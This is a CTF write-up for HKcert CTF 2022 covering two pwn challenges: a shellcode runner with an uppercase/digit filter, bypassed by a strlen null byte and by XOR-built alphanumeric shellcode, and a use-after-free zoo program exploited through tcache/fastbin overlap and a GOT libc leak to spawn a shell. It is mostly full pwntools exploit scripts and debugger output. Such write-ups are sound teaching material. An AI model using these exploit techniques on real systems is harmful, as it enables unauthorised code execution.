---
title: "HKcert CTF 2022 Writeups"
date: 2022-11-19T17:44:45+08:00
toc: true
draft: false
tags: [ctf]
---

<!--more-->

## Shellcode_runner2
The challenge is named shellcode_runner. As the name said, this challenge is about to craft a shellcode to get a shell.

The source code is very short, create a `rwx` memory region at address `0x13370000`, we can input a payload with 100 max size and the program will execute the payload as assembly code.

```c
shellcode = (char*) mmap((void *)0x13370000, SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
```

Before executing, the program check the payload whether only include uppercase and digit nubmers. 

```c
   if (is_all_upper(shellcode) == 0) {
        _abort("invalid shellcode!\n");
    }
```

```c
int is_all_upper(char* s) {a
    for (int i=0; i<strlen(s); i++)
        if (!isupper(s[i]) && !isdigit(s[i]) && s[i] != ' ')
            return 0;
    return 1;
}
```
We can see from the source code that, the binary doesn't limit the syscall, so our goal is clear, craft a shellcode and get the shell back.

### Unintended Solution

#### Locate the bug
The unintended solution is very simple, in the shellcode checking function:
```c
int is_all_upper(char* s) {a
    for (int i=0; i<strlen(s); i++)
        if (!isupper(s[i]) && !isdigit(s[i]) && s[i] != ' ')
            return 0;
    return 1;
}
```

`strlen` will stop at the first null byte of the string, so we can just padding the b'\x00' before the shellcode, then we are able to craft the shellcode without limitation. 

#### Solution

The plan is easy, use `shellcraft.sh()` to generate the getshell payload and padding the b'\x00' before the payload.

```python
sl(b'\x00'*4 + asm(shellcraft.sh()))
```

#### Full exploit
```python
from pwn import *

TARGET = './chall'
HOST = 'chal.hkcert22.pwnable.hk'
PORT = 28130
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    # libc = ELF('')
else:
    p = process(TARGET)
    libc = elf.libc
    gdbscript = '''b *0x0000000000401b4b'''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#--- helper functions
s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---

sl(b'\x00'*4 + asm(shellcraft.sh()))

p.interactive()

```

### Intended Solution

After solving this chal, I am curious that this challenge shouldn't worth 300 score if the above bug exist.

Then, I asked the author and he said that was unintended solution.

![](https://i.imgur.com/rz8VsIf.png)
![](https://i.imgur.com/yHgkm7v.png)


So, I decieded to solve this challenge with the intended solution - craft shellcode with only uppercase and digit number.

#### Search for similar challenge
There is many type of similar shellcode challenge in various CTF such as alphanumeric shellcode, even number shellcode, odd number shellcode, etc...

After searching in the internet, I found a similar shellcode challenge that is more stricted than the current which is only allowed hex number in the shellcode.

https://ctftime.org/writeup/34583

The solution of the above is to write shellcode that makes use of xors of known constant data values in order to builds a loader shellcode.

We can also use the same method to solve this challenge with the opcode table.
https://web.archive.org/web/20110716082850/http://skypher.com/wiki/index.php?title=X64_alphanumeric_opcodes

#### Exploit plan

The first idea is, this challenge didn't disallow any syscall, so we can try to craft a `read` syscall to bypass the limitation of byte instead of directly craft a `execve("/bin/sh", 0, 0)`

The program has told us the various register value before running the shellcode

```asm
Before running the shellcode:
rax = 0x13370000
rbx = 0x7fff7afd0468
rcx = 0x40
rdx = 0x13370000
rbp = 0x7fff7afd0270
rsp = 0x7fff7afd01c0
rsi = 0x13370000
rdi = 0x40
r8 = 0xffffffff
r9 = 0x40
r10 = 0x13370000
r11 = 0x7fff7afd01c0
r12 = 0x13370000
r13 = 0x40
```

To achieve the of `read` syscall, we need to control `rax`, `rdi`, `rsi`, `rdx` and from the above register info, we know that we only need to prepare the value of `rax` and `rdi`.

We abused `xor al, $imm` and `xor [rdx + $offset], al` to craft `0f05` of syscall and `5f` of `pop rdi`.

```asm
// Craft syscall
xor al, 0x44
xor al, 0x4b
xor [rdx + 0x42], al
xor al, 0x4e
xor al, 0x44
xor [rdx + 0x43], al

// Craft pop rdi
xor al, 0x5a    
xor [rdx + 0x41], al
```

For the `rax`, we can use `pop rax` to get the `0` from stack memory.
After that, we use `push rax` to pass the `0` to stack to pass it to rdi by `pop rdi`.

Combine the plan together, we can have the `read(0, 0x00000013370000, 0x00000013370000)` call, then we just need to pass the payload from `shellcraft.sh()` with a few padding.

Finally, we get the shell!.

#### Full exploit
```python
from pwn import *

TARGET = './chall'
HOST = 'chal.hkcert22.pwnable.hk'
PORT = 28130
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    # libc = ELF('')
else:
    p = process(TARGET)
    libc = elf.libc
    gdbscript = '''b *0x0000000000401b4b'''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#--- helper functions
s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---

sc = asm('''
// Craft syscall 
xor al, 0x44
xor al, 0x4b
xor [rdx + 0x42], al
xor al, 0x4e
xor al, 0x44
xor [rdx + 0x43], al

// Craft pop rdi
xor al, 0x5a    
xor [rdx + 0x41], al
''')
# pop rax to be 0
sc += asm("pop rax") * 0x29
# padding
sc += asm("push rax") * 5

# sc = "4D4K0BB4N4D0BC4Z0BAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXPPPPP"
# read(0, 0x00000013370000, 0x00000013370000)
sla("Input your shellcode here (max: 100):", sc)
input("getshell")
sl(b"A"*0x44 + asm(shellcraft.sh()))

p.interactive()

```
## UAF2

### Vulnerability
The bug is in`remove_animal` function
```c
free(zoo.animals[choice]->name);
free(zoo.animals[choice]);
```
There are not null the pointer after free, obivously this is a `UAF` bug.

### Exploit Plan
The idea to exploit is use `add_animal` function to create eight 0x18 size chunk and free it all. As the same size of tcache is only 7 slot, the remaining one will into fast-bins. 

```python
add(1, "A"*0x18) # 0
add(1, "B"*0x18) # 1
add(1, "C"*0x18) # 2
add(1, "D"*0x18) # 3
remove(0)
remove(1)
remove(2)
remove(3)
```

Here is the heap bins:
```bash
gef➤  heap bins
──────────────────────────────────────── Tcachebins for thread 1 ────────────────────────────────────────
Tcachebins[idx=0, size=0x20] count=7  ←  Chunk(addr=0xc77380, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xc77320, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xc77340, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xc772e0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xc77300, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xc772a0, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0xc772c0, size=0x20, flags=PREV_INUSE) 
───────────────────────────────── Fastbins for arena at 0x7f17eea04c80 ─────────────────────────────────
Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0xc77360, size=0x20, flags=PREV_INUSE) 
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────── Unsorted Bin for arena at 0x7f17eea04c80 ───────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────── Small Bins for arena at 0x7f17eea04c80 ────────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
──────────────────────────────── Large Bins for arena at 0x7f17eea04c80 ────────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.

```

Afterwards, we can use `add_animal` again to create a overlap chunk and we can put the `speak` and `got@printf` inside the overlap for the libc address leakage by `report_name`.
```python
speak = elf.symbols['speak']
got_printf = elf.got['printf']

payload = p64(speak) + p64(0) + p64(got_printf)

add(1, payload) # 4

report(2)
ru(": ")

libc_base = u64(r(6).ljust(8, b'\x00')) - 0x60770
leak("libc_base", libc_base)
```

```bash
gef➤  tele &zoo
0x000000004040c0│+0x0000: <zoo+0> add DWORD PTR [rax], eax
0x000000004040c8│+0x0008: 0x000000011522a0  →  0x00000001153392  →  0x0000000000000000
0x000000004040d0│+0x0010: 0x000000011522e0  →  0x00000001153252  →  0x0000000000000000
0x000000004040d8│+0x0018: 0x00000001152320  →  0x000000004012b3  →  <speak+0> endbr64 
0x000000004040e0│+0x0020: 0x00000001152360  →  0x0000000000001152
0x000000004040e8│+0x0028: 0x00000001152380  →  0x000000004012b3  →  <speak+0> endbr64 

gef➤  tele 0x00000001152320
0x00000001152320│+0x0000: 0x000000004012b3  →  <speak+0> endbr64 
0x00000001152328│+0x0008: 0x0000000000000000
0x00000001152330│+0x0010: 0x00000000404040  →  0x007fb77d78a770  →  <printf+0> endbr64 

```

Finally, we put the system and "/bin/sh" address into the payload and create overlap chunks and get the shell.
```python
libc_base = u64(r(6).ljust(8, b'\x00')) - 0x60770
leak("libc_base", libc_base)

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = p64(system) + p64(0) + p64(binsh)
add(1, payload)
add(1, payload)

add(1, payload)
report(1)
```

### Full exploit
```python
from pwn import *

TARGET = './chall'
HOST = 'chal.hkcert22.pwnable.hk'
PORT = 28236
context.arch = 'amd64' # i386/amd64
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']
elf = ELF(TARGET)

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote(HOST, PORT)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = process(TARGET)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    gdbscript = ''''''
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
       gdb.attach(p, gdbscript=gdbscript)

#--- helper functions
s       = lambda data               :p.send(data)        
sa      = lambda delim,data         :p.sendafter(delim, data) 
sl      = lambda data               :p.sendline(data) 
sla     = lambda delim,data         :p.sendlineafter(delim, data) 
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
# misc functions
uu32    = lambda data   :u32(data.ljust(4, b'\x00'))
uu64    = lambda data   :u64(data.ljust(8, b'\x00'))
leak    = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
#---

def add(index, name):
    sla(">", "1")
    sla(">", str(index))
    sla("Name of animal?", name)
    
def remove(index):
    sla(">", '2')
    sla("Zone number? (0-9)", str(index))
    
def report(index):
    sla(">", '3')
    sla("Zone number? (0-9)", str(index))

add(1, "A"*0x18) # 0
add(1, "B"*0x18) # 1
add(1, "C"*0x18) # 2
add(1, "D"*0x18) # 3
remove(0)
remove(1)
remove(2)
remove(3)

speak = elf.symbols['speak']
got_printf = elf.got['printf']

payload = p64(speak) + p64(0) + p64(got_printf)

add(1, payload) # 4

report(2)
ru(": ")

libc_base = u64(r(6).ljust(8, b'\x00')) - 0x60770
leak("libc_base", libc_base)

system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
payload = p64(system) + p64(0) + p64(binsh)
add(1, payload)
add(1, payload)

add(1, payload)
report(1)

p.interactive()
```